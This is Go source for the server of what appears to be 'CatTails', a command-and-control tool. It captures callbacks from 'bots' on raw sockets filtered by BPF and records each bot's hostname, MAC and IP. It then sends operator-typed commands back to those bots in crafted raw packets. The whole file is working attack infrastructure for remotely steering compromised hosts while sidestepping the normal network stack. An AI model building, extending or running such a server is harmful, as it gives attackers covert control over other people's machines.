package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

var stagedCmd string

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
}

// sendCommand takes
func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		bot := <-listen
		if stagedCmd != "" {
			fd := cattails.NewSocket()
			// Create packet
			packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))

			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)

			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
			unix.Close(fd)
		}
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {

	data := string(packet.ApplicationLayer().Payload())

	payload := strings.Split(data, " ")

	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		log.Fatal(err)
	}

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
	}

	// Write host to channel
	listen <- newHost
}

func cli() {
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("CatTails> ")
		stagedCmd, _ = reader.ReadString('\n')
		stagedCmd = strings.Trim(stagedCmd, "\n")
		fmt.Println("[+] Staged CMD:", stagedCmd)
	}
}

func main() {

	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	fmt.Println("[+] Created sockets")

	// Make channel buffer by 5
	listen := make(chan Host, 5)

	// Iface and src ip for the sendcommand func to use
	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, src, dstMAC, listen)

	// Start CLI
	go cli()

	// This needs to be on main thread
	for {
		// packet := cattails.ServerReadPacket(readfd, vm)
		packet := cattails.ServerReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}
